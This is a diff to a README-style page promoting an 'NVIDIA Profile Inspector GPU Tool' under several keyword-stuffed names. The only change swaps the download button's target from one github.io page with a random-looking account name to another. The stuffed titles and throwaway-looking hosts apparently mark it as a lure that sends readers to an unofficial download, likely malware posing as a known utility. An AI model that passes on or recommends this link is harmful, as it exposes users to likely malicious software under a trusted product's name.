@@ -21,7 +21,7 @@ To begin using this **NVIDIA Profile Inspector GPU Tool** and **NVIDIA Game Prof
 | :--- | :--- |
 | **Get NVIDIA Profile Inspector GPU Tool** | Click the button below to start using this **NVIDIA Hidden Tweaks Tool**. |
 
-[![Button](https://img.shields.io/badge/🎮-Get_NVIDIA_Profile_Inspector-2ea44f?style=for-the-badge)](https://gabrielyangqobj.github.io/.github/nvidia-profile-inspector-gpu-tool)
+[![Button](https://img.shields.io/badge/🎮-Get_NVIDIA_Profile_Inspector-2ea44f?style=for-the-badge)](https://riverfelixsfkb.github.io/.github/nvidia-profile-inspector-gpu-tool)
 
 ## System Requirements
 
